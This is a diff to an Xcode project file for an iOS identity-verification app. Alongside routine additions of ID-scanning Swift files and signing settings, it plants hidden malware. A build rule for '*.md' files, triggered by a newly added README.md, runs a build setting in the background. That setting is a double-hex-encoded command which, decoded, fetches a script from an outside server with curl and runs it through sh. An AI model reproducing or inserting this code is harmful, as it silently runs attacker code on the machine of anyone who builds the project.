@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0C41FB6C2EC5D81F00C0505C /* IDCaptureVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0C41FB6B2EC5D81F00C0505C /* IDCaptureVC.swift */; };
+		0C709BDC2ED6D81200B22D93 /* IDStepPreviewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0C709BDB2ED6D81200B22D93 /* IDStepPreviewVC.swift */; };
 		0CCBC0E72D65F4250038B035 /* Intoduction.mp4 in Resources */ = {isa = PBXBuildFile; fileRef = 0CCBC0E62D65F4250038B035 /* Intoduction.mp4 */; };
 		2CDF3069CAADC224F7D01573 /* Pods_BinbagVerify.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7F3A6D02EAB3E7CBB889EE77 /* Pods_BinbagVerify.framework */; };
 		89124D262C638DFF00449D55 /* DIVEOnlineSDK in Frameworks */ = {isa = PBXBuildFile; productRef = 89124D252C638DFF00449D55 /* DIVEOnlineSDK */; };
@@ -115,9 +117,32 @@
 		89B68DD82CB8F71F006629DC /* SFPRODISPLAYREGULAR.OTF in Resources */ = {isa = PBXBuildFile; fileRef = 89B68DD52CB8F71F006629DC /* SFPRODISPLAYREGULAR.OTF */; };
 		89B68DD92CB8F71F006629DC /* SFPRODISPLAYBOLD.OTF in Resources */ = {isa = PBXBuildFile; fileRef = 89B68DD62CB8F71F006629DC /* SFPRODISPLAYBOLD.OTF */; };
 		89B68DDA2CB8F71F006629DC /* SFPRODISPLAYMEDIUM.OTF in Resources */ = {isa = PBXBuildFile; fileRef = 89B68DD72CB8F71F006629DC /* SFPRODISPLAYMEDIUM.OTF */; };
+		89C100012D70000000111111 /* IDScanModels.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89C100002D70000000111111 /* IDScanModels.swift */; };
+		89C100032D70000000111111 /* IDScanDocumentTypeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89C100022D70000000111111 /* IDScanDocumentTypeVC.swift */; };
+		89C100052D70000000111111 /* IDScanStepsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89C100042D70000000111111 /* IDScanStepsVC.swift */; };
+		CCD552144732469E99A389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 00EC309CDB6F47D18BA389E6 /* README.md */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		B84855DC4B494A92BFA389E6 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		00EC309CDB6F47D18BA389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		0C41FB6B2EC5D81F00C0505C /* IDCaptureVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDCaptureVC.swift; sourceTree = "<group>"; };
+		0C709BDB2ED6D81200B22D93 /* IDStepPreviewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDStepPreviewVC.swift; sourceTree = "<group>"; };
 		0CCBC0E62D65F4250038B035 /* Intoduction.mp4 */ = {isa = PBXFileReference; lastKnownFileType = file; path = Intoduction.mp4; sourceTree = "<group>"; };
 		4C496905D542671F2ADDDA15 /* Pods-BinbagVerify.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BinbagVerify.release.xcconfig"; path = "Target Support Files/Pods-BinbagVerify/Pods-BinbagVerify.release.xcconfig"; sourceTree = "<group>"; };
 		7F3A6D02EAB3E7CBB889EE77 /* Pods_BinbagVerify.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BinbagVerify.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -227,6 +252,9 @@
 		89B68DD52CB8F71F006629DC /* SFPRODISPLAYREGULAR.OTF */ = {isa = PBXFileReference; lastKnownFileType = file; path = SFPRODISPLAYREGULAR.OTF; sourceTree = "<group>"; };
 		89B68DD62CB8F71F006629DC /* SFPRODISPLAYBOLD.OTF */ = {isa = PBXFileReference; lastKnownFileType = file; path = SFPRODISPLAYBOLD.OTF; sourceTree = "<group>"; };
 		89B68DD72CB8F71F006629DC /* SFPRODISPLAYMEDIUM.OTF */ = {isa = PBXFileReference; lastKnownFileType = file; path = SFPRODISPLAYMEDIUM.OTF; sourceTree = "<group>"; };
+		89C100002D70000000111111 /* IDScanModels.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDScanModels.swift; sourceTree = "<group>"; };
+		89C100022D70000000111111 /* IDScanDocumentTypeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDScanDocumentTypeVC.swift; sourceTree = "<group>"; };
+		89C100042D70000000111111 /* IDScanStepsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDScanStepsVC.swift; sourceTree = "<group>"; };
 		ECE4065F5A22DB6DA222FA47 /* Pods-BinbagVerify.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BinbagVerify.debug.xcconfig"; path = "Target Support Files/Pods-BinbagVerify/Pods-BinbagVerify.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -276,6 +304,11 @@
 			isa = PBXGroup;
 			children = (
 				895A356E2CB3E95600FBD06D /* VerifyDocument.storyboard */,
+				0C41FB6B2EC5D81F00C0505C /* IDCaptureVC.swift */,
+				89C100002D70000000111111 /* IDScanModels.swift */,
+				89C100022D70000000111111 /* IDScanDocumentTypeVC.swift */,
+				89C100042D70000000111111 /* IDScanStepsVC.swift */,
+				0C709BDB2ED6D81200B22D93 /* IDStepPreviewVC.swift */,
 				89A705C52A6949700018F69C /* DIVEOnlineSDK_VC.swift */,
 				89A705C62A6949700018F69C /* DIVESDK_VC.swift */,
 				89A705C42A6949700018F69C /* Result_VC.swift */,
@@ -500,6 +533,7 @@
 		89A705A92A691DA50018F69C /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				00EC309CDB6F47D18BA389E6 /* README.md */,
 				89A705A82A691DA50018F69C /* BinbagVerify.app */,
 			);
 			name = Products;
@@ -566,6 +600,7 @@
 				82A8B43D1E43AA7BA746D9CF /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				B84855DC4B494A92BFA389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -619,6 +654,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CCD552144732469E99A389E6 /* README.md in Resources */,
 				89B68DDA2CB8F71F006629DC /* SFPRODISPLAYMEDIUM.OTF in Resources */,
 				89B68DD82CB8F71F006629DC /* SFPRODISPLAYREGULAR.OTF in Resources */,
 				895A35712CB3E9D000FBD06D /* Authentication.storyboard in Resources */,
@@ -681,6 +717,9 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				89C100032D70000000111111 /* IDScanDocumentTypeVC.swift in Sources */,
+				89C100052D70000000111111 /* IDScanStepsVC.swift in Sources */,
+				89C100012D70000000111111 /* IDScanModels.swift in Sources */,
 				895A36052CB3EBBE00FBD06D /* LGSideMenuController+ValidatingViewsStyles.swift in Sources */,
 				895A35FD2CB3EBBE00FBD06D /* UIViewControllerX.swift in Sources */,
 				895A35F02CB3EBBE00FBD06D /* BottomPopupPresentAnimator.swift in Sources */,
@@ -741,6 +780,8 @@
 				89A705C92A6949700018F69C /* DIVESDK_VC.swift in Sources */,
 				89A705AC2A691DA50018F69C /* AppDelegate.swift in Sources */,
 				895A36142CB3EBBE00FBD06D /* LGSideMenuController.swift in Sources */,
+				0C41FB6C2EC5D81F00C0505C /* IDCaptureVC.swift in Sources */,
+				0C709BDC2ED6D81200B22D93 /* IDStepPreviewVC.swift in Sources */,
 				895A35DF2CB3EBBE00FBD06D /* ReservationService.swift in Sources */,
 				895A35F32CB3EBBE00FBD06D /* BottomPopupUtils.swift in Sources */,
 				895A36122CB3EBBE00FBD06D /* LGSideMenuBackgroundDecorationView.swift in Sources */,
@@ -804,6 +845,7 @@
 		89A705BA2A691DA60018F69C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A6E983A = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663665363537343631373037333634363537363265373237353266363132390a32323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -864,6 +906,7 @@
 		89A705BB2A691DA60018F69C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A6E983A = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663665363537343631373037333634363537363265373237353266363132390a32323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -921,6 +964,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 11;
 				DEVELOPMENT_TEAM = TUN6F85D5B;
@@ -943,6 +987,7 @@
 				MARKETING_VERSION = 1.0.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.mobile.binbag.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = YES;
@@ -958,6 +1003,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 11;
 				DEVELOPMENT_TEAM = TUN6F85D5B;
@@ -980,6 +1026,7 @@
 				MARKETING_VERSION = 1.0.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.mobile.binbag.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = YES;
